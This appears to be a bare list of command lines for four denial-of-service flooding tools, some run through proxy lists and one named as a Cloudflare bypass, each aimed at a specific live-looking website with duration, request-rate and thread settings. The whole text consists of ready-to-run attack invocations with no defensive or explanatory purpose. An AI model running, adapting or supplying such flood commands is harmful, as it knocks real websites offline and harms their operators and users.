tool 2
node tlsv2.js https://subvip24h.site 1200 100000

tool 1
go run cloudflare.go https://subvip24h.site 12000 100000 proxy.txt 100000

tool 3
go run main.go https://subvip24h.site 120000 100000 proxy.txt 100000

./main <target> <duration> <rps> <proxylist> <threads>

tool 4
node phong_bypass.js target time rate thread proxyfile
